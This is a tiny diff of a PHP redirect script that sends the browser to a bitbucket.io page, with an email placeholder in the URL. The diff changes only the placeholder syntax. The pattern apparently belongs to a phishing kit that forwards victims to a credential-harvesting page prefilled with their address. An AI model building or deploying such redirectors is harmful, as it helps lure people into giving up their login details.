@@ -1,5 +1,5 @@
 <?php
 //Redirect Browser
-header("Location: https://127002.bitbucket.io/#[-EMAIL-]");
+header("Location: https://127002.bitbucket.io/#[[-Email-]]");
 exit();
 ?>
